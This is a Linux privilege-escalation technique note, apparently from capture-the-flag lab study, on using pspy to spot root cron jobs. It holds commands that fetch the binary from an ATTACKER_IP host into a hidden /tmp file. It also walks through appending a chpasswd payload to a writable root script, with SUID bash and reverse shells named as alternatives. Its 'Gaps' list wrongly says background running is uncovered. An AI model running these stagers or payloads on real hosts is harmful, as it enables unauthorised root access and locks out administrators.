---
type: technique
platform: linux
status: working
fluency: guided
source: thm
updated: 2026-09-04
---

# PSPY — Watching Processes Without Root

A snapshot tool tells you what is on disk. `pspy` tells you what is **running**, including commands started by root, without needing root yourself. Reach for it the moment the file-based sweeps come back stock, and any time an empty result could mean "not permitted to see it".

```text
https://github.com/dominicbreuker/pspy
```

## The problem it solves

A cron job that fires every minute, runs `tar`, and exits in 40 milliseconds is invisible to every tool that takes a snapshot. `ps aux` shows it only if you happen to type it inside that 40 ms window, and the job's definition lives in `/var/spool/cron/crontabs/root` — mode 600, which you will not read. So the job exists, matters, and leaves no trace you can reach.

`pspy` catches it while it is alive.

## What it actually does — and does not

**It watches process creation, not cron.** `pspy` never opens `/etc/crontab`, `/etc/cron.d/`, or any crontab file. It reports processes. Cron jobs show up because a cron job *is* a process when it runs — and so are systemd timers, another user's interactive commands, and a daemon's children. Nothing labels a line as a cron job; **you** infer it from the same command line repeating on a fixed interval.

**It is not purely event-driven, and it is not pure polling either.** Two mechanisms run together:

```text
1. inotify watches on /usr /tmp /etc /home /var /opt   (recursive, the defaults)
   -> a filesystem event fires an immediate /proc scan
2. a /proc scan on a fixed interval, regardless of events
   -> the safety net for events that never arrive
```

Mechanism 1 is what makes it beat polling: a starting process almost always touches the filesystem, so inotify delivers the "look now" signal at precisely the right instant. Turning the interval down without understanding this is the common mistake — the interval is the backstop, not the engine.

**It does not bypass any permission.** On a stock Linux host, `/proc/<pid>/cmdline` and `/proc/<pid>/status` are readable by everyone; that is how `ps` shows you other users' processes at all. `pspy` reads exactly what any user could read, only fast enough to catch processes that are about to disappear.

## Getting it onto the host

**Why now** — the manual sweeps are done and at least one of them came back empty in a way that could mean "hidden" rather than "absent". `pspy` is a static binary and has to arrive before it can answer anything, so this step is pure logistics — but it is also where the technique most often fails, in a way that looks exactly like the tool being broken.

First, once, onto **your** box — the target has no internet, you do:

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```

Then serve the directory it landed in (`python3 -m http.server 8000`) and pull it onto the target:

```bash
wget -q http://ATTACKER_IP:8000/pspy64 -O /tmp/.p && chmod +x /tmp/.p
```

```bash
file /tmp/.p
```

- four binaries ship on the releases page: `pspy32`, `pspy64` (around 4 MB) and the [[Security-Terms#^upx|UPX]]-compressed `pspy32s`, `pspy64s` (around 1 MB, same `latest/download/` path). The small ones matter on a slow or awkward transfer.
- `-O /tmp/.p` → a short, dot-prefixed name. It keeps the binary out of a casual `ls` and out of the way of a `noexec` mount if you have to move it; check `mount | grep /tmp` first, because a `noexec` `/tmp` produces a permission error that reads like a missing execute bit.
- `file` before running it → **not optional.** A GitHub *page* saved instead of the release asset is HTML, and it produces a syntax error that looks like a broken tool rather than a broken download. This one check saves the twenty minutes normally spent debugging the wrong thing.
- `uname -m` on the target first → an `aarch64` host will not run the `pspy64` [[Security-Terms#^x86-64|x86-64]] build, and the failure message names an exec format problem rather than an architecture one.

**What you will see**

- **Found** — `file` answering `ELF 64-bit LSB executable, x86-64, statically linked`. Statically linked is the point: there is no library on the target for it to be missing.
- **Empty** — a zero-byte file means the transfer completed against nothing. Check the URL and that the server is actually serving from the directory holding the binary.
- **Error** — `HTML document text` from `file` means you downloaded a web page. `cannot execute binary file: Exec format error` is an architecture mismatch. `Permission denied` on a file that is `+x` is a `noexec` mount — move it to somewhere else writable, often the home directory.
- **Noise** — `wget` printing nothing at all with `-q` is expected and is not evidence the transfer worked. The `file` line is the evidence.

**Then** — a verified binary goes to the watch below. No egress at all goes to [[File-Transfer]], which covers the transports that do not need an HTTP server.

## Watch, and wait long enough

**Why now** — you have the binary and an empty result somewhere upstream. This is the command that turns "I saw nothing" into either a command line with `UID=0` on it or a genuine negative, and the difference between those two outcomes is almost entirely how long you left it running.

```bash
/tmp/.p -pf -i 1000 -c
```

- `-p` → print commands. On by default; naming it explicitly makes the intent readable when you paste the command back into notes.
- `-f` → also print filesystem events. Noisy, but it shows *what the job touched*, which is often the only way to find the script when the command line itself is just a wrapper.
- `-i <ms>` → milliseconds between the unconditional `/proc` scans. This is the backstop, not the engine; lowering it below about 100 costs CPU and catches very little that inotify missed.
- `-r <dirs>` → directories to watch recursively, defaulting to `/usr /tmp /etc /home /var /opt`. Worth extending when the application lives somewhere unusual, such as `/srv` or `/data`.
- `-c` → colour by [[Security-Terms#^uid|UID]], which makes `UID=0` lines findable at a glance in a wall of output.
- give it at least one full plausible interval. A minute covers a lab job; a job you have not waited for looks exactly like a job that does not exist.

**What you will see**

- **Found** — `CMD: UID=0  PID=1937 | /bin/bash /root/run-backup.sh`. A root command line you did not start. Copy it verbatim: the path in it is the next thing you `ls -l`. Subtract two timestamps of the same command to get the interval, and that interval decides the priority of the whole path.
- **Empty** — silence is a negative on **short** jobs only. Ten quiet minutes rules out an every-minute job, says nothing about a daily one, and says nothing at all on a `hidepid` host. Before treating silence as an answer, confirm you can see other users' processes at all: run `ps aux | grep -c root` and check it is not one.
- **Error** — a syntax error or a stream of HTML means the download problem above. `panic: too many open files` on a host with a low `ulimit -n` means the inotify watches could not all be registered; narrow them with `-r /etc,/opt` rather than watching everything.
- **Noise** — three kinds, and all three cost time. The opening flood is the **existing** process table being enumerated, not new activity; ignore that first block and watch for timestamps that keep advancing after it. Lines with `UID=0` and an empty command field are kernel threads with no `cmdline`. And a command that appears exactly once is usually a person or a boot-time child, not a schedule — wait for a second occurrence before spending effort on it.

> [!important]
> If `/proc` is mounted with `hidepid=1` or `hidepid=2`, other users' process directories are hidden and `pspy` sees only your own processes. Check with `mount | grep proc` **before** concluding a host has no root jobs. An empty run on a `hidepid` host is not a negative result; it is no result at all, and it should be recorded that way.

**Then** — a repeating `UID=0` line goes to [[Cron-Jobs]], which is where you test whether you can write the file it names. A root command line with **no slash** in it goes to [[Linux-PATH-Abuse]] instead. A root command that globs over a directory goes to [[Wildcard-Injection]]. A genuine silence, on a host where you have confirmed you can see other users' processes, closes the scheduled-job category and pushes the weight onto credentials.

## Worked case — a writable root script caught while it ran

**Why now** — the readable cron files were stock and the file sweeps found nothing. This is what the payoff looks like end to end, including the part that only `pspy` could have supplied.

Running as an ordinary user, with the binary already staged:

```text
2026/02/10 06:40:16 CMD: UID=0  PID=1937 | /bin/bash /root/run-backup.sh
2026/02/10 06:40:16 CMD: UID=0  PID=1942 | /bin/bash /root/run-rm-tmp.sh
2026/02/10 06:40:16 CMD: UID=0  PID=1943 | /bin/bash /usr/local/bin/rm-tmp.sh
```

Two of those paths are under `/root` and unreadable. The third is not — and it is only because `pspy` printed the wrapper's **child** that you know root executes anything in `/usr/local/bin` at all. Nothing readable on the filesystem named that path.

```bash
ls -la /usr/local/bin/rm-tmp.sh
```

```bash
# -rwxrwxrwx 1 root root 57 Jan 20 10:27 /usr/local/bin/rm-tmp.sh
```

Root-owned, world-writable, executed by root on a loop. Both halves of the [[Cron-Jobs]] condition hold, so the escalation is to **append** a payload rather than replace the file:

```bash
echo 'echo "root:newpass" | chpasswd' >> /usr/local/bin/rm-tmp.sh
```

- `>>` not `>` → the script keeps doing its real job, so nothing on the host visibly breaks while you have the shell.
- wait one full interval before testing. The 60-second rhythm you measured from the timestamps is how long the payload takes to become true.

**What you will see**

- **Found** — `su` accepting the new password after the next tick. With a `chmod +s /bin/bash` payload instead, the confirmation is an `s` in `ls -l /bin/bash` and no password involved.
- **Empty** — nothing changing after two full intervals means the append did not take (check the file with `tail`), or the job you measured is not the one that runs this script.
- **Error** — the job's own output goes to mail or to syslog, never to your terminal, so a payload with a syntax error fails silently. `bash -n` on the script checks your added line without running it.
- **Noise** — the script's own normal behaviour continues either way, so "it still deletes `/tmp`" is not evidence that the payload ran.

> [!warning]
> `chpasswd` replaces the real root password. Convenient in a lab, destructive anywhere else: it locks out the legitimate administrator and is trivially visible in an audit. Prefer a payload that adds access rather than replacing a credential — `chmod +s /bin/bash`, or a reverse shell. Options and trade-offs in [[Cron-Jobs]] and [[Shells]].

**Then** — the new credential or SUID shell goes to [[Shells]] to be stabilised, and then the whole enumeration starts again as the new user.

## Rarely — worth one command, not worth a step

**Why now** — the binary will not run, or the watch needs to outlive a session you do not trust to stay up.

```bash
wget -q http://ATTACKER_IP:8000/pspy32 -O /tmp/.p32
```

- `Exec format error` from the 64-bit build means the host is 32-bit, not that the download broke. The project ships both and the smaller one is the only fix.
- Confirm with `file` before assuming; a truncated transfer produces a different message and a different remedy.

```bash
nohup /tmp/.p -pf -i 1000 > /tmp/.plog 2>&1 &
```

- A watch has to run for longer than the interval of whatever you are hunting, and a job scheduled hourly outlives most unstable reverse shells. Detaching it means the log survives the session even if you do not.
- Read `/tmp/.plog` on reconnect. The lines you want were written while you were gone, which is the entire point.

**What you will see**

- **Found** — the 32-bit build runs, or a log file holding events from a period you were not watching.
- **Empty** — an empty log after a long watch is a real answer: nothing scheduled ran in that window, so widen the window rather than the filter.
- **Error** — `nohup: ignoring input` on the first line is normal output, not a failure.
- **Noise** — a detached watch keeps writing. Check the file size before reading it, or it will fill the terminal.

**Then** — a captured command goes back to the worked case above, unchanged. An empty log after an hour goes to step 5 of [[Linux-Run-Sheet]], because what you are chasing may not be scheduled at all.

## Reading the output

**This tool answers a question the rest of the sweep cannot ask.** Everything else photographs disk state; `pspy` samples time. That means its negatives are bounded by patience in a way no other tool's are, and "I ran pspy and saw nothing" is only ever "nothing fired in N minutes". Write the N down.

**Nothing in the output is labelled.** `pspy` reports processes, not schedules, so the inference from "this command line repeats every 60 seconds" to "there is a cron entry" is yours to make. That inference is usually right and occasionally wrong: a systemd timer produces the identical pattern, and `systemctl list-timers --all` is what distinguishes them.

**A capture is loud in the one way that matters.** The binary sits on disk, it holds inotify watches on half the filesystem, and it runs for minutes. On a monitored host that is a much larger footprint than the handful of reads in [[Linux-Local-Enumeration]], and it is worth deciding deliberately rather than by habit.

## Next

- [[Cron-Jobs]] — where a `UID=0` line goes next: which file it names, and whether you can write it
- [[Linux-PATH-Abuse]] — when the root command line has **no slash** in it
- [[File-Transfer]] — getting the binary onto a host with no direct egress

## Gaps

- **Nothing on running it in the background.** A long capture wants `nohup /tmp/.p > /tmp/.o &` or a second shell; neither is written up, and neither is safe on a monitored host.
- **`-f` output is barely covered here.** Filesystem events are how you catch a job writing to a file whose *process* you missed, and that reading deserves its own section once a box needs it.
- **No systemd timer note.** `pspy` cannot tell a timer from a cron job; the enumeration that can is still listed as unwritten in [[Linux-Privilege-Escalation]].
- Nothing on the defensive side: `hidepid` is named above, but not what the audit trail of a `pspy` run looks like.
